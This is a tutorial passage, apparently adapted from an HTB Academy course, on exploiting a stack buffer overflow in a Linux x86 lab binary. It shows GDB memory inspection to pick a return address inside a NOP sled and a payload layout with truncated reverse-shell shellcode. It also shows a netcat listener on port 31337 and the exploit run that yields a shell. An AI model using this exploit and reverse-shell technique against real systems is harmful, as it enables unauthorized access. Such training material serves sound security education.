After checking that we still control the EIP with our shellcode, we now need a memory address where our NOPs are located to tell the EIP to jump to it. This memory address must not contain any of the bad characters we found previously.

#### GDB NOPS

  Identification of the Return Address

```shell-session
(gdb) x/2000xb $esp+1400

<SNIP>
0xffffd5ec:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5f4:	0x55	0x55	0x55	0x55	0x55	0x55	0x90	0x90
								# End of "\x55"s   ---->|  |---> NOPS
0xffffd5fc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd604:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd60c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd614:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd61c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd624:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd62c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd634:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd63c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd644:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |---> Shellcode
<SNIP>
```

Here, we now have to choose an address to which we refer the `EIP` and which reads and executes one byte after the other starting at this address. In this example, we take the address `0xffffd64c`. Illustrated, it then looks like this:

#### Buffer

![image](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_9.png)

After selecting a memory address, we replace our "`\x66`" which overwrites the EIP to tell it to jump to the `0xffffd64c` address. Note that the input of the address is entered backward.

#### Notes

  Identification of the Return Address

```shell-session
   Buffer = "\x55" * (1040 - 100 - 95 - 4) = 841
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11\xd4...<SNIP>...\x5a\x22\xa2"
      EIP = "\x4c\xd6\xff\xff"
```

Since our shellcode creates a reverse shell, we let `netcat` listen on port 31337.

#### Netcat - Reverse Shell Listener

  Identification of the Return Address

```shell-session
student@nix-bow:$ nc -nlvp 31337

Listening on [0.0.0.0] (family 0, port 31337)
```

After starting our `netcat` listener, we now run our adapted exploit again, which then triggers the CPU to connect to our listener.

#### Exploitation

  Identification of the Return Address

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

#### Netcat - Reverse Shell Listener

  Identification of the Return Address

```shell-session
Listening on [0.0.0.0] (family 0, port 31337)
Connection from 127.0.0.1 33504 received!

id

uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

We now see that we got a connection from the local IP address. However, it is not obvious if we have a shell. So we type the command "`id`" to get more information about the user. If we get a return value with information, we know that we are in a shell, as shown in the example.

**Credit:** This information was adapted from an excellent guide on [HTB Academy](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-linux-x86). Be sure to check out the original post for more details.